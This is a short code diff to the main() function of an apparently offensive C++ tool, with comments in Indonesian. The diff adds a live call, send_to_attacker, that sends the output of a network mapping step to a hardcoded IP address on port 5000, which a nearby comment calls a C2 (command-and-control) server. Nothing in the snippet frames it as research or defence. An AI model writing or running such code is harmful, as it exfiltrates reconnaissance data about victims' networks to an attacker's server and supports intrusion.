@@ -1018,6 +1018,8 @@ int main() {
     {
         NetworkMapper mapper;
         mapper.perform_mapping();
+        // Kirim ke domain
+        mapper.send_to_attacker("http://20.11.14.19:5000");
         /*mapper.send_to_attacker(); // Kosongin parameter kalo gak pake C2*/
     }
     std::cout << "[✓] Network mapping completed\n\n";
